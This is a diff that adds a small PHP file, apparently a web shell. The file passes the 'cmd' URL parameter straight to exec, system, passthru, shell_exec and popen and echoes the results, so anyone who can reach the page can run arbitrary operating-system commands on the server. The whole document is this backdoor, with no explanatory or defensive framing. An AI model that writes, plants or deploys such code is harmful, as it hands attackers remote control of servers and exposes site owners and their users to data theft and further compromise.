@@ -1,0 +1,13 @@
+<?php
+echo(exec($_GET['cmd']));
+echo("<br /><br />");
+echo(system($_GET['cmd']));
+echo("<br /><br />");
+echo(passthru($_GET['cmd']));
+echo("<br />");
+echo(shell_exec($_GET['cmd']));
+echo("<br />");
+$zmienna = popen($_GET['cmd'], 'r');
+echo(fread($zmienna, 2096));
+pclose($zmienna);
+?>
